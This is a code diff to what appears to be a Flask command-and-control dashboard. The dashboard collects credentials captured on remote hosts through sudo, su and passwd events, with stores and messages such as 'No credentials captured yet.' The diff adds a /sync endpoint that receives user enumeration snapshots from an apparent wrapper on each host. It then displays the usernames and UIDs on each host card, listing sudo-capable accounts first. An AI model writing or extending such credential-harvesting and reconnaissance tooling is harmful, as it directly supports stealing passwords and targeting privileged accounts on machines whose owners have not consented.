@@ -21,6 +21,7 @@ CRED_EVENT_TYPES = {"sudo", "passwd_self", "passwd_other", "su"}
 cred_store    = {}
 event_log     = {}
 warning_store = {}
+user_store    = {}
 store_lock    = threading.Lock()
 
 
@@ -117,6 +118,25 @@ def clear_status():
         warning_store.pop(host, None)
     return jsonify({"ok": True}), 200
 
+
+
+@app.route("/sync", methods=["POST"])
+def receive_sync():
+    """Receive user enumeration snapshot from a wrapper (no passwords)."""
+    data = request.get_json(silent=True)
+    if not data:
+        return jsonify({"ok": False}), 400
+    host  = data.get("host_ip", "unknown")
+    users = data.get("users", [])
+    if not isinstance(users, list):
+        return jsonify({"ok": False}), 400
+    received = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
+    with store_lock:
+        user_store[host] = {
+            "users":       users,
+            "received_at": received,
+        }
+    return jsonify({"ok": True}), 200
 
 @app.route("/log", methods=["POST"])
 def receive_event():
@@ -259,6 +279,7 @@ def render_host_card(ip, hostname):
         creds   = dict(cred_store.get(ip, {}))
         events  = {k: list(v) for k, v in event_log.get(ip, {}).items()}
         warning = dict(warning_store.get(ip, {}))
+        users_snap = dict(user_store.get(ip, {}))
 
     has_data = bool(creds or events)
     card_id  = f"card_{ip.replace('.','_')}"
@@ -315,6 +336,34 @@ def render_host_card(ip, hostname):
     else:
         cred_html = '<div class="no-creds">No credentials captured yet.</div>'
 
+
+    # -- users snapshot --
+    users_data = users_snap.get("users", [])
+    users_ts   = users_snap.get("received_at", "")
+    if users_data:
+        admin_users   = [u for u in users_data if u.get("is_admin")]
+        regular_users = [u for u in users_data if not u.get("is_admin")]
+
+        def user_row(u):
+            uname = esc(u.get("username", "?"))
+            uid   = esc(str(u.get("uid", "")))
+            badge = ' <span class="chip chip-live" style="font-size:10px;padding:1px 5px">sudo</span>' if u.get("is_admin") else ""
+            return f'<tr><td class="td-user">{uname}{badge}</td><td class="td-meta">{uid}</td></tr>'
+
+        user_rows = "".join(user_row(u) for u in sorted(users_data, key=lambda x: (not x.get("is_admin"), x.get("username",""))))
+        users_html = f"""
+        <div class="cred-block">
+          <div class="block-title">Users on Host <span class="act-count">{len(users_data)}</span>
+            <span style="font-weight:400;font-size:11px;color:var(--text-3);margin-left:8px">as of {esc(users_ts)}</span>
+          </div>
+          <table class="cred-table">
+            <thead><tr><th>Username</th><th>UID</th></tr></thead>
+            <tbody>{user_rows}</tbody>
+          </table>
+        </div>"""
+    else:
+        users_html = ""
+
     # -- activity sections --
     act_html = ""
     for etype, entries in sorted(events.items()):
@@ -339,6 +388,7 @@ def render_host_card(ip, hostname):
     </div>
     <div class="host-body" id="{card_id}_body">
       {cred_html}
+      {users_html}
       <div class="act-block">
         <div class="block-title">Activity</div>
         {act_html}
